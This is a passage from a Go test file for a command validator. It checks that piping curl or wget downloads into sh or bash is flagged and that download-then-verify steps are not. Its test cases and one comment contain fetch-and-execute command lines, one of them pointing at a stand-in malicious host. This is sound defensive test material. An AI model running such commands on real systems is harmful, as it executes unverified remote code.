	errs := validator.Validate(rb, validator.Options{})
	if hasWarningContaining(errs, "TLS verification") {
		t.Errorf("secure curl should not be flagged: %v", errs)
	}
}

// TestT29_PipeToShellWarning verifies that piping curl or wget output directly
// into sh or bash is detected and warned. This pattern executes arbitrary
// remote code without any verification and is a well-known supply-chain
// attack vector (e.g., curl https://malicious.example | sh).
func TestT29_PipeToShellWarning(t *testing.T) {
	cases := []struct {
		name    string
		command string
	}{
		{"curl-pipe-sh", "curl -fsSL https://example.com/install.sh | sh"},
		{"curl-pipe-bash", "curl https://raw.example.com/setup | bash"},
		{"wget-pipe-sh", "wget -qO- https://example.com/bootstrap.sh | sh"},
		{"curl-pipe-bash-flag", "curl -L https://example.com/run | bash -s -- --arg"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rb := makeAST(ast.StepNode{
				Name:    "pipe-to-shell",
				Command: tc.command,
				Line:    1,
			})

			errs := validator.Validate(rb, validator.Options{})
			if !hasWarningContaining(errs, "pipes a download") {
				t.Errorf("expected pipe-to-shell warning for %q, got: %v", tc.command, errs)
			}
		})
	}
}

// TestT29_DownloadThenVerifyNotFlagged verifies that downloading a file first
// and then executing it separately (the safe pattern) is not flagged.
func TestT29_DownloadThenVerifyNotFlagged(t *testing.T) {
	rb := makeAST(ast.StepNode{
		Name:    "safe-install",
		Command: "curl -fsSL https://example.com/install.sh -o install.sh\nchecksum install.sh\nbash install.sh",
		Line:    1,
	})

	errs := validator.Validate(rb, validator.Options{})
	if hasWarningContaining(errs, "pipes a download") {
		t.Errorf("download-then-verify pattern should not be flagged: %v", errs)
	}
}
